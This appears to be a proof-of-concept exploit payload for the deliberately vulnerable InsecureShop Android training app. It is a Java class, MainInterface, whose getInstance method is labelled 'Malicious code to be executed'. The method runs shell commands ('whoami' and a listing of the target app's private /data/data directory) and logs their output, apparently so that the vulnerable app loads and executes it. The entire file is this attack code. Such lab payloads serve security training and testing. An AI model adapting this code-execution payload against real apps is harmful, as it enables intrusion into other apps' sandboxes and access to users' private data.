package com.insecureshopapp;

import android.content.Context;
import android.util.Log;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class MainInterface {
    public static Object getInstance(Context context) {
        // Malicious code to be executed
        StringBuilder output = new StringBuilder();
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", "whoami;ls /data/data/com.insecureshop/");
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            Log.d("MainInterface", "Command Output: " + output.toString());
        }
        catch (Exception e) {
            return null;
        }
        return null;
    }
}